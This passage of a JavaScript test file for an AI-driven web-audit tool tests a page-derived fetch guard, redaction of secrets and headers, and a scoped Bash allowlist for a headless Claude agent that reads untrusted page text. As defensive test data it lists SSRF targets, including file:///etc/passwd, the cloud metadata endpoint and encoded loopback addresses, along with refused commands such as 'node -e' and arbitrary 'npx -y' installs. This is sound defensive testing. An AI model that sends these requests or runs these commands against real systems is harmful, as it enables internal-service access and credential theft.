    else process.env.CHROME_BIN = savedBin;
    rmSync(dir, { recursive: true, force: true });
  }
}

// har records the network while a page loads, but a response can land after the
// fixed observation window: a fetch/XHR the page fires post-load, or a CDP event
// still queued under host CPU starvation. The primitive must settle the network
// before snapshotting rather than trusting the sleep, and it must say how long
// the load waiter took (web-uplift-e13). The server here deliberately holds the
// response past the window, so a primitive that trusts the sleep reports
// response.status 200 with no body and a non-zero pending count.
async function testHarWaitsForPendingResponses() {
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/slow.json') {
      setTimeout(() => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"slow":true}');
      }, 1500);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>slow-fixture</title><link rel="icon" href="data:,">' +
        '<script>fetch("/slow.json");</script><h1>slow</h1>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'slow-network.har');
    const result = await gather('har', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, bodies: true, out });
    assert(Number.isFinite(result.loadWaitMs), `har must report how long the load waiter took: ${result.loadWaitMs}`);
    assert(
      result.networkPendingAtSnapshot === 0,
      `har must settle the network before snapshotting; ${result.networkPendingAtSnapshot} still pending`,
    );
    const har = JSON.parse(readFileSync(out, 'utf8'));
    const slow = har.log.entries.find((e) => e.request.url.endsWith('/slow.json'));
    assert(
      slow?.response?.content?.text === '{"slow":true}',
      `har must capture a body that arrives after the observation window: ${JSON.stringify(slow?.response?.content)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The trackers primitive records HOSTNAMES, so a third party whose hostname
// merely ENDS WITH the first-party hostname ('notlocalhost' for a page on
// 'localhost') must still be counted, while a SUBDOMAIN of the first party
// ('sub.localhost') must not be. The old bare `!endsWith(firstParty)` suffix
// match classified the first case as first-party and dropped it, and with it any
// known tracker on such a host.
async function testTrackersThirdPartySuffix() {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>trackers-fixture</title><link rel="icon" href="data:,">' +
        '<img src="http://notlocalhost:9/tracker.js" alt="">' +
        '<img src="http://sub.localhost:9/sub.js" alt=""><h1>trackers fixture</h1>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const result = await gather('trackers', `http://localhost:${port}/`, { quiet: true, wait: 1500 });
    const third = (result.topThirdPartyByRequests || []).map((e) => e.origin);
    assert(
      result.firstParty === 'localhost',
      `trackers must record the page hostname as firstParty, got ${result.firstParty}`,
    );
    assert(
      third.includes('notlocalhost'),
      `a third party whose host only ends with the first-party host must still be counted: ${JSON.stringify(third)}`,
    );
    assert(
      !third.includes('localhost'),
      `the first-party host itself must not be counted as third-party: ${JSON.stringify(third)}`,
    );
    // Without this the test still passes with the subdomain clause deleted from
    // isFirstPartyHost (a mutant reduced to `host === firstParty` classifies
    // sub.localhost as third-party).
    assert(
      !third.includes('sub.localhost'),
      `a SUBDOMAIN of the first-party host must count as first-party: ${JSON.stringify(third)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The interact deadline must be validated in the LOOP, not only in the CLI
// parser: a caller that passes opts.interactDeadlineMs directly to gather()
// bypasses parseArgs, and a non-finite or non-positive value would make
// `elapsed >= NaN` false forever with sleep(NaN) spinning at 0ms. No browser is
// needed here: the helper only reads collector.entries.
// The interact deadline must be bounded by the LOOP, not only by the CLI parser:
// gather() calls never go through parseArgs, and NaN/Infinity are not nullish, so
// a bad programmatic value used to make `elapsed >= NaN` false forever with
// sleep(NaN) spinning at 0ms. A bad value must degrade to the default bounded
// wait (the parser keeps its fail-fast usage error for CLI typos). No browser is
// needed here: the helper only reads collector.entries.
async function testConsoleInteractDeadlineValidation() {
  const fake = { entries: [] };
  for (const bad of [NaN, Infinity, -Infinity, 0, -5, null, undefined, '']) {
    const r = await waitForInteractEvidence(fake, 0, bad);
    assert(
      r.deadlineMs === 250 && r.observed === false && r.pending === false && r.waitedMs >= 200 && r.waitedMs < 1000,
      `a bad deadline (${String(bad)}) must degrade to the default bounded wait: ${JSON.stringify(r)}`,
    );
  }

  // A numeric string is coerced, and a valid number is honoured.
  const str = await waitForInteractEvidence(fake, 0, '500');
  assert(str.deadlineMs === 500 && str.waitedMs >= 450, `a numeric string deadline must be coerced: ${JSON.stringify(str)}`);
  const num = await waitForInteractEvidence(fake, 0, 60);
  assert(num.deadlineMs === 60 && num.waitedMs >= 55, `a valid deadline must be honoured: ${JSON.stringify(num)}`);

  // An entry that arrives during the wait is observed and not reported pending.
  const collector = { entries: [] };
  setTimeout(() => collector.entries.push({ kind: 'exception', level: 'error', source: 'runtime', text: 'x' }), 20);
  const seen = await waitForInteractEvidence(collector, 0, 500);
  assert(
    seen.observed === true && seen.pending === false,
    `an entry during the wait must be observed and not pending: ${JSON.stringify(seen)}`,
  );
}

// iconSatisfies memoises its size matcher; the cache must not change what it
// classifies. This pins the cached path against the direct construction over a
// matrix that includes 'any', multiple and padded sizes, a non-matching size,
// the exact call-site sizes, and a string size argument (web-uplift-33h).
function testIconSatisfiesMatrix() {
  const direct = (icons, size) => {
    const re = new RegExp(`(^|\\s)${size}x${size}(\\s|$)`);
    return (icons || []).some((i) => {
      const sizes = String(i?.sizes || '');
      return /any/i.test(sizes) || re.test(sizes);
    });
  };
  const iconSets = [
    [{ sizes: '192x192' }, { sizes: '512x512' }],
    [{ sizes: '512x512 192x192' }],
    [{ sizes: 'any' }],
    [{ sizes: 'ANY' }],
    [{ sizes: '192x192 ' }],
    [{ sizes: ' 512x512' }],
    [{ sizes: '' }],
    [{ sizes: null }],
    [{}],
    [],
    null,
    [{ sizes: '48x48' }],
    [{ sizes: '192x192x192' }],
    [{ sizes: '512x512' }, null, { sizes: '192x192' }],
  ];
  for (const icons of iconSets) {
    for (const size of [192, 512, 96, '192']) {
      assert(
        iconSatisfies(icons, size) === direct(icons, size),
        `iconSatisfies must classify like the direct construction for ${size}: ${JSON.stringify(icons)}`,
      );
    }
  }
}

// The label-boundary comparison is shared by the trackers first-party test and
// the cookies domain test. The raw suffix match it replaced called lookalikes
// first-party ('evil-example.com' for a page on 'example.com', or the reverse),
// and the cookies call site kept its own copy of that bug until web-uplift-yu8,
// which is why there is now one helper. This pins it over the lookalike matrix,
// including full-width subdomains and the cookie leading-dot form.
function testFirstPartyHostMatrix() {
  const core = [
    ['example.com', 'example.com', true],
    ['sub.example.com', 'example.com', true],
    ['a.b.example.com', 'example.com', true],
    ['evil-example.com', 'example.com', false],
    ['notexample.com', 'example.com', false],
    ['example.com.evil.net', 'example.com', false],
    ['example.com', 'sub.example.com', false],
    [undefined, 'example.com', false],
    ['example.com', '', false],
    ['example.com', undefined, false],
  ];
  for (const [host, base, expected] of core) {
    assert(
      isFirstPartyHost(host, base) === expected,
      `isFirstPartyHost(${JSON.stringify(host)}, ${JSON.stringify(base)}) must be ${expected}`,
    );
  }

  const cookie = [
    ['example.com', 'example.com', false],
    ['sub.example.com', '.example.com', false],
    ['a.b.example.com', 'example.com', false],
    ['example.com', 'evil-example.com', true],
    ['evil-example.com', 'example.com', true],
    ['notexample.com', 'example.com', true],
    ['example.com', undefined, false],
    ['example.com', '', false],
    ['', 'example.com', true],
  ];
  for (const [pageHost, domain, expected] of cookie) {
    assert(
      isThirdPartyCookie(pageHost, domain) === expected,
      `isThirdPartyCookie(${JSON.stringify(pageHost)}, ${JSON.stringify(domain)}) must be ${expected}`,
    );
  }
}

// The audit docs tell the model to run modern-web-guidance through npx. They must
// all name the version pinned as guidanceCatalogVersion in
// knowledge/principles.json: an unpinned @latest has no lockfile entry and no
// integrity check, so it makes audits irreproducible and lets a compromised
// publish execute on the audit host (factory-audit TM-006, web-uplift-2op). This
// check is what stops a version bump from leaving a stale literal or an @latest
// behind in any of the docs the model reads.
function testGuidanceVersionPinnedInDocs() {
  const pinned = readJson('knowledge/principles.json').guidanceCatalogVersion;
  assert(
    /^modern-web-guidance@\d+\.\d+\.\d+$/.test(pinned),
    `guidanceCatalogVersion must pin a concrete version, got ${pinned}`,
  );
  const docs = [
    'knowledge/guidance.md',
    'runner/README.md',
    'AGENTS.md',
    '.github/copilot-instructions.md',
    'web-uplift.example.json',
    'schema/config.schema.json',
  ];
  for (const rel of docs) {
    const text = readFileSync(join(repoRoot, rel), 'utf8');
    const refs = [...text.matchAll(/modern-web-guidance@([^\s"'`]+)/g)].map((m) => m[1]);
    assert(refs.length > 0, `${rel} must name the pinned guidance version (${pinned})`);
    for (const raw of refs) {
      // A permission rule can follow the version directly, e.g.
      // `modern-web-guidance@0.0.172:*` in the headless allowlist docs, so strip
      // a trailing rule suffix before comparing. A genuinely different version
      // (or an @latest) still fails.
      const ref = raw.replace(/[:*)]+$/, '');
      assert(
        `modern-web-guidance@${ref}` === pinned,
        `${rel} names modern-web-guidance@${raw}, but guidanceCatalogVersion is ${pinned}`,
      );
    }
  }
}

// The headless Claude allowlist must name the intended invocations, not the
// interpreter prefixes that match arbitrary trailing arguments: `Bash(node:*)`
// and `Bash(npx:*)` permitted `node -e '<code>'` and `npx -y <any-package>` in
// the same process tree that ingests untrusted page text (threat model I4,
// web-uplift-tia). The guidance entry must stay pinned to guidanceCatalogVersion,
// which is what ties this allowlist to the 2op documentation pin.
function testHeadlessAllowlistIsScoped() {
  const args = AGENTS.claude.args('prompt', { maxTurns: 3 });
  const index = args.indexOf('--allowedTools');
  assert(
    index >= 0 && index + 1 < args.length,
    `claude headless args must carry --allowedTools: ${JSON.stringify(args)}`,
  );
  const allowed = args[index + 1];

  for (const blanket of ['Bash(node:*)', 'Bash(npx:*)']) {
    assert(
      !allowed.includes(blanket),
      `the headless allowlist must not grant ${blanket} (it matches arbitrary trailing arguments): ${allowed}`,
    );
  }

  for (const entry of [
    'Bash(node evidence/cli.mjs:*)',
    'Bash(node .web-uplift/evidence/cli.mjs:*)',
    'Bash(mkdir:*)',
    'Bash(ffmpeg:*)',
  ]) {
    assert(allowed.includes(entry), `the headless allowlist must keep the intended ${entry}: ${allowed}`);
  }

  // A bare tool name is a PREFIX, so `Bash(npx -y lighthouse:*)` would also match
  // `npx -y lighthouse-evil`: Lighthouse is deliberately absent, and if it is ever
  // added it must carry an exact version right after the package name.
  assert(
    !/Bash\(npx [^)]*lighthouse[^@:)]*:\*\)/.test(allowed),
    `the headless allowlist must not grant a bare tool prefix such as lighthouse: ${allowed}`,
  );

  const pinned = readJson('knowledge/principles.json').guidanceCatalogVersion;
  assert(
    allowed.includes(`Bash(npx -y --ignore-scripts ${pinned}:*)`),
    `the guidance allowlist entry must name the pinned ${pinned}: ${allowed}`,
  );
}

// The skill-vs-write-scope contract has its own dependency-free guard (same
// shape as tests/cdp-copy-sync.mjs, for the same reason: it must be runnable
// with no npm install). Drive it here so `npm test` covers the contract that
// refused a COMPLETED audit in web-uplift-ies run 4: SKILL.md instructed
// `scratch/` while allowedRoots allowed only the run's --out directory
// (web-uplift-16f). The guard carries its own mutation controls, so a neutered
// check fails there rather than here.
function testSkillWriteContractGuard() {
  const guard = spawnSync(process.execPath, [join(repoRoot, 'tests', 'skill-write-contract.mjs')], { encoding: 'utf8' });
  assert(guard.status === 0, `skill-write-contract guard must pass: ${guard.stderr || guard.stdout}`);
}
// A page controls the manifest href and the redirects the raw fetch follows, and
// both are fetched by the privileged Node process. The guard must refuse every
// private target, including every IP literal encoding, and fail closed on a name
// it cannot resolve (threat model I2 / F-003, web-uplift-2kh).
async function testPageDerivedFetchGuard() {
  const refused = [
    'file:///etc/passwd',
    'data:text/plain,hi',
    'blob:https://example.com/x',
    'ftp://example.com/x',
    'http://2130706433/',
    'http://0x7f.0.0.1/',
    'http://0177.0.0.1/',
    'http://127.1/',
    'http://127.0.0.1/',
    'http://0.0.0.0/',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.1/',
    'http://172.16.0.1/',
    'http://192.168.1.1/',
    'http://100.64.0.1/',
    'https://198.18.0.1/',
    'http://[::1]/',
    'http://[::ffff:127.0.0.1]/',
    'http://[fe80::1]/',
    'http://[fc00::1]/',
    'http://localhost:1234/m.webmanifest',
    'http://no-such-name.invalid/m.webmanifest',
  ];
  for (const candidate of refused) {
    let error = null;
    try {
      await assertPageDerivedFetchAllowed(candidate, { targetOrigin: 'https://example.com' });
    } catch (e) {
      error = e;
    }
    assert(error && /refused:/.test(error.message), `the fetch guard must refuse ${candidate}: ${error?.message}`);
  }

  // The exemption is ORIGIN-scoped: the same host on a different port is another
  // local service and must be refused (adversarial review P1a: a page served from
  // 127.0.0.1:8080 must not be able to read 127.0.0.1:2375).
  let crossPort = null;
  try {
    await assertPageDerivedFetchAllowed('http://127.0.0.1:2375/containers/json', { targetOrigin: 'http://127.0.0.1:8080' });
  } catch (e) {
    crossPort = e;
  }
  assert(crossPort && /refused:/.test(crossPort.message), `the exemption must not cross ports: ${crossPort?.message}`);

  // Public IP literals need no DNS and must stay fetchable (this direction is what
  // catches an over-blocking classification bug); the audited target's own ORIGIN
  // is exempt so a deliberate local audit keeps working; a relative href resolves
  // against the target.
  for (const publicUrl of ['http://93.184.216.34/m.webmanifest', 'http://8.8.8.8/', 'http://1.1.1.1/', 'http://[2606:4700:4700::1111]/']) {
    const allowedUrl = await assertPageDerivedFetchAllowed(publicUrl, { targetOrigin: 'https://example.com' });
    assert(allowedUrl.href.length > 0, `a public address must stay fetchable: ${publicUrl}`);
  }
  const exempt = await assertPageDerivedFetchAllowed('http://127.0.0.1:8080/m.webmanifest', { targetOrigin: 'http://127.0.0.1:8080' });
  assert(exempt.port === '8080', `the audited target ORIGIN must be exempt: ${exempt.href}`);
  const relative = await assertPageDerivedFetchAllowed('/m.webmanifest', {
    base: 'http://127.0.0.1:8080/deep/page',
    targetOrigin: 'http://127.0.0.1:8080',
  });
  assert(relative.pathname === '/m.webmanifest', `a relative manifest href must resolve against the target: ${relative.href}`);
}

// The redirect is where a first-URL-only check fails: Node's fetch follows
// redirects internally, so the guard has to re-validate every hop, bound the hop
// count and cap the body. A legitimate same-host fetch must still go through.
async function testSafeFetchRedirectAndSizeGuard() {
  // A second local service on another port: the P1a exploit shape is a page on the
  // audited origin pointing its manifest at this one.
  const secret = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"Secret":"cross-port local service"}');
  });
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/ok.json') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    if (path === '/redirect-private') {
      res.writeHead(302, { Location: 'http://169.254.169.254/latest/meta-data/' });
      res.end();
      return;
    }
    if (path === '/redirect-file') {
      res.writeHead(302, { Location: 'file:///etc/passwd' });
      res.end();
      return;
    }
    if (path === '/redirect-loop') {
      res.writeHead(302, { Location: '/redirect-loop' });
      res.end();
      return;
    }
    if (path === '/sw-redirect') {
      res.writeHead(302, { Location: 'http://169.254.169.254/latest/meta-data/' });
      res.end();
      return;
    }
    if (path === '/huge.json') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('x'.repeat(4096));
      return;
    }
    res.writeHead(404);
    res.end('nope');
  });
  await new Promise((resolveListen) => secret.listen(0, '127.0.0.1', resolveListen));
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    const targetOrigin = base;

    // POSITIVE, end to end: the body really arrives through the guard (an
    // over-blocking bug fails here, not just in the URL validation above).
    const ok = await safeFetch(`${base}/ok.json`, { targetOrigin });
    assert(
      JSON.parse(await ok.text()).ok === true,
      'a legitimate same-origin fetch must fetch and return its body through the guard',
    );

    // P1a: same host, different port is a different origin and must be refused.
    const secretOrigin = `http://127.0.0.1:${secret.address().port}`;
    let crossPortError = null;
    try {
      await safeFetch(`${secretOrigin}/containers/json`, { targetOrigin });
    } catch (e) {
      crossPortError = e;
    }
    assert(crossPortError && /refused:/.test(crossPortError.message), `a same-host different-port fetch must be refused: ${crossPortError?.message}`);

    // P1b: the worker-script URL starts same-origin, but a redirect to a private
    // address must be refused on that path too.
    let swError = null;
    try {
      await safeFetch(`${base}/sw-redirect`, { targetOrigin });
    } catch (e) {
      swError = e;
    }
    assert(swError && /refused:/.test(swError.message), `a worker-script redirect to a private address must be refused: ${swError?.message}`);

    for (const path of ['/redirect-private', '/redirect-file', '/redirect-loop']) {
      let error = null;
      try {
        await safeFetch(`${base}${path}`, { targetOrigin });
      } catch (e) {
        error = e;
      }
      assert(error && /refused:/.test(error.message), `${path} must be refused: ${error?.message}`);
    }

    let capError = null;
    try {
      const big = await safeFetch(`${base}/huge.json`, { targetOrigin, maxBytes: 1024 });
      await big.text();
    } catch (e) {
      capError = e;
    }
    assert(capError && /exceeded/.test(capError.message), `an oversized body must be refused: ${capError?.message}`);

    const relativeFetch = await safeFetch('/ok.json', { base: `${base}/deep/page`, targetOrigin });
    assert(JSON.parse(await relativeFetch.text()).ok === true, 'a relative href must resolve against the base and fetch');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
    await new Promise((resolveClose) => secret.close(resolveClose));
  }
}

// The redaction itself, without a browser: every credential header name is
// replaced by the placeholder while a non-secret header is untouched, so the
// redaction cannot be satisfied by over-redacting everything (web-uplift-dxk).
// THE SKILL <-> SANDBOX CONTRACT DRIFT CHECK (web-uplift-7tj). The headless
// Claude allowlist and the commands SKILL.md instructs the agent to run are two
// halves of one contract, and nothing used to compare them: the scoped list
// omitted the report validator, the scorecard, the compare, the Baseline oracle
// and the journey replay, and its prefix rules missed absolute-path
// invocations, so a REAL headless audit was blocked 38s in by permission
// denials for steps the skill mandates - invisible to every check that read the
// allowlist on its own. This test re-reads SKILL.md and fails in BOTH
// directions: a `node <script>` command the skill instructs that the contract
// table does not declare (the sandbox forbids a mandated step), and a declared
// entry the skill nowhere instructs (speculative sandbox widening). It also
// replays the real failure mode under the documented STRING-PREFIX matching:
// every spelling the allowlist generates must admit the corresponding command,
// including the ABSOLUTE-PATH form the 7tj run was denied on, while lookalike
// commands stay refused.
function testHeadlessAllowlistMatchesSkillContract() {
  const skill = readFileSync(join(repoRoot, '.claude/skills/web-audit/SKILL.md'), 'utf8');

  // 1. Every `node <path>.mjs` command SKILL.md instructs the agent to run
  //    (the vendored `.web-uplift/` spelling normalises to the same script).
  const instructed = new Set(
    [...skill.matchAll(/\bnode ((?:\.web-uplift\/)?[\w./-]+\.mjs)\b/g)]
      .map((m) => m[1].replace(/^\.web-uplift\//, '')),
  );
  assert(instructed.size > 0, 'could not extract any node commands from SKILL.md; the drift check is blind');
  const declared = new Set(SKILL_REQUIRED_COMMANDS.map((c) => c.script));
  for (const script of instructed) {
    assert(
      declared.has(script),
      `SKILL.md instructs the agent to run \`node ${script}\`, but runner/agents.mjs SKILL_REQUIRED_COMMANDS ` +
        `does not declare it, so the headless allowlist DENIES a step the skill requires (web-uplift-7tj). ` +
        `Add it to the contract table or change the skill to stop requiring it.`,
    );
  }
  for (const entry of SKILL_REQUIRED_COMMANDS) {
    assert(
      instructed.has(entry.script),
      `SKILL_REQUIRED_COMMANDS declares \`${entry.script}\` (${entry.skillStep}), but SKILL.md nowhere ` +
        `instructs \`node ${entry.script}\`. The allowlist must admit exactly what the skill requires, ` +
        `nothing speculative.`,
    );
  }

  // 2. Admission under the STRING-PREFIX semantics documented in agents.mjs:
  //    `Bash(<prefix>:*)` admits command C iff C starts with <prefix>.
  const root = '/srv/web-uplift-checkout';
  const rules = headlessBashRules({ root });
  const admits = (command) =>
    rules.some((rule) => {
      const m = /^Bash\((.*):\*\)$/.exec(rule);
      return m !== null && (command === m[1] || command.startsWith(m[1]));
    });

  for (const { script } of SKILL_REQUIRED_COMMANDS) {
    const admitted = [
      `node ${script} axe https://example.com --out evidence`,
      `node .web-uplift/${script} --help`,
      `node ${root}/${script} --help`, // the ABSOLUTE-PATH form the 7tj run was denied on
      `node ${root}/.web-uplift/${script} --help`,
    ];
    for (const command of admitted) {
      assert(admits(command), `the derived allowlist must admit \`${command}\` (a form of skill-required \`${script}\`): ${rules.join(', ')}`);
    }
  }

  const pinned = readJson('knowledge/principles.json').guidanceCatalogVersion;
  assert(
    admits(`npx -y --ignore-scripts ${pinned} search color-scheme`),
    `the derived allowlist must admit the pinned guidance feed invocation ${pinned}`,
  );

  // 3. Posture: the derivation may not have widened the sandbox. Refusals the
  //    tightening (e2138c9 + bd7de74) bought stay refused.
  const refused = [
    'node -e process.exit(0)',
    'node evidence/evil.mjs --help',
    `node ${root}/evidence/evil.mjs --help`,
    'node /etc/passwd',
    'npx -y some-package',
    'npx -y lighthouse https://example.com',
    'npx -y modern-web-guidance-evil search color-scheme',
    'npx -y web-uplift evidence screenshot https://example.com',
  ];
  for (const command of refused) {
    assert(!admits(command), `the derived allowlist must still refuse \`${command}\`: ${rules.join(', ')}`);
  }

  // 4. The production claude args carry EXACTLY the derived rules (so the
  //    contract cannot be bypassed by a hand-maintained copy in the args) -
  //    in BOTH directions: every derived rule is present, and nothing beyond
  //    the fixed file-tools prefix and the derived rules has been hand-added
  //    (a widening entry such as `Bash(node:*)` must fail here, not pass
  //    silently because the subset direction still holds).
  const args = AGENTS.claude.args('prompt', { maxTurns: 3, root });
  const allowed = args[args.indexOf('--allowedTools') + 1];
  const expected = ['Read,Write,Edit,Glob,Grep', ...rules].join(',');
  assert(
    allowed === expected,
    `claude --allowedTools must be EXACTLY the file tools plus the derived rules, nothing more, nothing less.\nexpected: ${expected}\nactual:   ${allowed}`,
  );
}
function testRedactHeaderList() {
  const list = [
    { name: 'Set-Cookie', value: 'a=1' },
    { name: 'cookie', value: 'b=2' },
    { name: 'Authorization', value: 'Bearer x' },
    { name: 'proxy-authorization', value: 'Basic y' },
    { name: 'X-Auth-Token', value: 't' },
    { name: 'x-api-key', value: 'k' },
    { name: 'X-Amz-Security-Token', value: 's' },
    { name: 'Content-Type', value: 'application/json' },
    { name: 'ETag', value: 'W/"abc"' },
  ];
  const redacted = redactHeaderList(list);
  assert(redacted.length === list.length, 'the redaction must not drop headers');
  for (let i = 0; i < 7; i++) {
    assert(redacted[i].value === '[redacted]', `${list[i].name} must be redacted by value: ${JSON.stringify(redacted[i])}`);
    assert(redacted[i].name === list[i].name, `the header name must be preserved: ${JSON.stringify(redacted[i])}`);
  }
  assert(
    redacted[7].value === 'application/json' && redacted[8].value === 'W/"abc"',
    `non-secret headers must be untouched: ${JSON.stringify(redacted.slice(7))}`,
  );
}

// A HAR carries every recorded request's and response's headers, and this repo
// commits evidence-out artifacts to a public remote, so a page-supplied bearer
// token or API key would be published irreversibly. Credential header VALUES are
// redacted by default (names, counts, status and URL metadata stay);
// --no-redact-headers is the explicit opt-out (web-uplift-dxk).
//
// Scope note, measured rather than assumed: Chrome keeps Set-Cookie and Cookie out
// of the Network.requestWillBeSent / responseReceived events this harness consumes
// (they live in the *ExtraInfo events it does not listen to), so the headers that
// actually reach a HAR today are page-supplied request headers such as
// Authorization and X-Api-Key. The full name list is still applied defensively,
// and testRedactHeaderList covers all of it without a browser.
async function testHarRedactsCredentialHeaders() {
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/api') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>creds</title><link rel="icon" href="data:,">' +
        '<script>fetch("/api",{headers:{Authorization:"Bearer super-secret-token","X-Api-Key":"super-secret-api-key"}})</script>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const url = `http://127.0.0.1:${port}/`;
    const token = 'super-secret-token';
    const apiKey = 'super-secret-api-key';

    const out = join(tmp, 'redacted-network.har');
    const result = await gather('har', url, { quiet: true, wait: 600, out });
    const harText = readFileSync(out, 'utf8');
    const summaryText = readFileSync(result.summaryArtifact, 'utf8');
    const har = JSON.parse(harText);

    for (const [label, text] of [['the HAR', harText], ['the network summary', summaryText]]) {
      assert(!text.includes(token), `${label} must not carry the raw Authorization value`);
      assert(!text.includes(apiKey), `${label} must not carry the raw API-key value`);
    }

    const api = har.log.entries.find((e) => e.request.url.endsWith('/api'));
    assert(api, `the fixture request must be recorded: ${har.log.entries.map((e) => e.request.url).join(', ')}`);
    const auth = (api.request.headers || []).find((h) => h.name.toLowerCase() === 'authorization');
    assert(
      auth && auth.value === '[redacted]',
      `a request Authorization must be redacted by value: ${JSON.stringify(api.request.headers)}`,
    );
    const apiKeyHeader = (api.request.headers || []).find((h) => h.name.toLowerCase() === 'x-api-key');
    assert(
      apiKeyHeader && apiKeyHeader.value === '[redacted]',
      `a request X-Api-Key must be redacted by value: ${JSON.stringify(api.request.headers)}`,
    );
    const contentType = (api.response.headers || []).find((h) => h.name.toLowerCase() === 'content-type');
    assert(
      contentType && contentType.value.includes('json'),
      `a non-secret header must be untouched: ${JSON.stringify(api.response.headers)}`,
    );

    const rawOut = join(tmp, 'raw-network.har');
    await gather('har', url, { quiet: true, wait: 600, out: rawOut, redactHeaders: false });
    const rawText = readFileSync(rawOut, 'utf8');
    assert(
      rawText.includes(token) && rawText.includes(apiKey),
      '--no-redact-headers must keep the raw credential values for an operator who accepts the risk',
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The secrets scan reports what it matched without republishing it: a finding
// carries the pattern, severity, source and the match length, never a character
// of the credential. The old shape kept the first six and last four characters
// (and the whole value for a match of twelve characters or fewer), and those
// findings are written into run artifacts that can be published (web-uplift-u5n).
async function testSecretsArtifactDoesNotPersistMatches() {
  const secret = 'NOTAREALKEY_FIXTURE_ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/clean') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<!doctype html><title>clean</title><body>nothing secret here</body>');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>secrets</title><link rel="icon" href="data:,">' +
        `<script>const api_key="${secret}";</script>`,
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'secrets.json');
    const result = await gather('secrets', `http://127.0.0.1:${port}/`, { quiet: true, wait: 300, out });
    assert(result.totalFindings >= 1, `the fixture secret must still be reported: ${JSON.stringify(result.findings)}`);
    const finding = result.findings.find((f) => f.match !== undefined);
    assert(finding && finding.match === '[redacted]', `a finding must not carry the matched value: ${JSON.stringify(finding)}`);
    assert(
      typeof finding.matchLength === 'number' && finding.matchLength > 0,
      `a finding should report the match length instead of the value: ${JSON.stringify(finding)}`,
    );
    const artifact = readFileSync(out, 'utf8');
    for (const [label, text] of [['the artifact', artifact], ['stdout', JSON.stringify(result)]]) {
      assert(!text.includes(secret), `${label} must not carry the matched value`);
    }
    const clean = await gather('secrets', `http://127.0.0.1:${port}/clean`, { quiet: true, wait: 300 });
    assert(clean.totalFindings === 0, `a page with no secret must report none: ${JSON.stringify(clean.findings)}`);
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// A page-derived script URL is attacker-controlled text, and it used to be
// interpolated into the evaluated fetch() expression UNQUOTED (web-uplift-991),
// unlike every other interpolation in the file. Empirically (this fixture was
// built to find out): the DOM URL-serializes apostrophes in http(s) script URLs
// to %27, so THAT spelling is not reachable - but a data: URL's opaque path is
// NOT normalized, so a raw quote in it reaches the interpolation verbatim. With
// the unquoted form the expression is a syntax error the try/catch swallows and
// the external script is silently NEVER scanned. The fixture keeps the planted
// key percent-encoded so the page HTML itself contains no key: a finding can
// only come from the fetched external script.
async function testSecretsScanHandlesQuotedScriptUrl() {
  const encKey = Array.from('AKIAIOSFODNN7EXAMPLE')
    .map((c) => '%' + c.charCodeAt(0).toString(16).toUpperCase())
    .join('');
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      `<!doctype html><title>quoted</title><link rel="icon" href="data:,">` +
        `<script src="data:text/plain,x='${encKey}"></script><body>page</body>`,
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const result = await gather('secrets', `http://127.0.0.1:${port}/`, { quiet: true, wait: 300 });
    const ext = result.findings.filter((f) => typeof f.source === 'string' && f.source.startsWith('external JS'));
    assert(
      ext.length >= 1 && ext[0].pattern === 'aws-access-key',
      `the quoted data: script URL must still be fetched and scanned (a syntax-erroring fetch is a silent skip): ${JSON.stringify(result.findings)}`,
    );
    assert(
      !result.findings.some((f) => f.source === 'page HTML'),
      `the key is percent-encoded in the HTML, so a page-HTML finding would mean the fixture is wrong: ${JSON.stringify(result.findings)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}


// The persisted shape itself, without a browser. The fixture value is built at
// runtime so this file contains no provider-shaped key literal, and the scan is
// asked directly: what a finding may carry is the pattern, severity, source and
// the match LENGTH, never a character of the matched value. This is the precise
// check for the old behaviour, which kept the first six and last four characters
// of the match (web-uplift-u5n).
function testSecretsScanDoesNotPersistMatchCharacters() {
  const value = 'sk_' + 'live_' + 'A'.repeat(30);
  const findings = scanTextForSecrets(`const api_key="${value}"`, 'unit fixture');
  assert(findings.length > 0, `the fixture value must be reported: ${JSON.stringify(findings)}`);
  for (const finding of findings) {
    if (finding.match === undefined) continue; // the "more matches" note carries no value
